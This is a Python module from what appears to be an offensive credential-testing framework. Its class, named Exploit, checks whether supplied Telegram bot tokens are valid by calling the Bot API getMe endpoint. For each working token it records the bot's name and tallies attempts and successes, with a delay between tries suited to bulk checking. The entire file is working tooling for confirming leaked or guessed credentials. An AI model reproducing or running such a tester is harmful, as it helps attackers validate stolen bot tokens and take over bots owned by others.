"""Telegram Credential Tester.

Telegram authenticates with a phone number + one-time login code, not a
username/password pair, and cloud password checks are blocked (the auth.* MTProto
methods are not exposed over plain HTTP). As a best effort over HTTP:

- If the target looks like a bot token (contains ":"), it is validated against
  the Bot API getMe endpoint.
- Anything else is reported as unsupported rather than silently misclassified.
"""
import time
from webforg.modules.auth.base_login_tester import BaseSocialLoginTester, LoginResult, AccountProfile


class Exploit(BaseSocialLoginTester):
    name = "Telegram Credential Tester"
    description = "Checks Telegram bot tokens via the Bot API; password checks are blocked by Telegram (phone+code auth only)."
    author = "K0uR1i"
    rank = "manual"

    platform_name = "telegram"

    def attempt_login(self, username: str, password: str) -> LoginResult:
        start = time.time()
        result = LoginResult(username=username, password=password, success=False)
        if ":" not in username:
            result.error_type = "not_supported: Telegram uses phone+code auth; password checks are blocked"
            result.response_time_ms = (time.time() - start) * 1000
            self._stats["attempted"] += 1
            return result
        try:
            resp = self.target.session.post(
                f"https://api.telegram.org/bot{username}/getMe",
                timeout=10,
            )
            result.response_time_ms = (time.time() - start) * 1000
            self._stats["attempted"] += 1
            if resp.status_code == 200 and resp.json().get("ok"):
                result.success = True
                bot = resp.json().get("result", {})
                result.profile_data = {"bot": bot.get("username", ""), "bot_name": bot.get("first_name", "")}
                self._stats["successful"] += 1
            elif "unauthorized" in resp.text.lower() or resp.status_code == 401:
                result.error_type = "invalid_bot_token"
            else:
                result.error_type = f"http_{resp.status_code}"
            time.sleep((self.get_option("DELAY_MS") or 1000) / 1000)
        except Exception as e:
            self._stats["errors"] += 1
            result.error_type = f"connection_error: {str(e)[:50]}"
        return result

    def parse_login_response(self, response, username, password):
        pass

    def extract_profile(self, session_token: str, username: str) -> AccountProfile:
        return AccountProfile(platform="telegram", username=username, email="")
